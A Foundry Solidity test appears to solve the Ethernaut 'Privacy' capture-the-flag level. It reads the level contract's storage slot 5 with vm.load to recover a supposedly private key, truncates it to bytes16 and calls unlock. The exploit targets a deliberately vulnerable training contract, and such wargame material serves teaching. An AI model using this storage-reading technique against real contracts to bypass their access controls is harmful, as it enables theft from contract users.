// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {PrivacyFactory} from "../src/factories/PrivacyFactory.sol";
import {Privacy} from "../src/levels/Privacy.sol";

import "forge-std/console.sol";

contract PrivacyTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        PrivacyFactory factory = new PrivacyFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolvePrivacy() public {
        Privacy instance = Privacy(payable(levelAddress));

        // [START]

        bytes32 data = vm.load(levelAddress, bytes32(uint256(5)));

        console.logBytes32(data);

        instance.unlock(bytes16(data));

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}
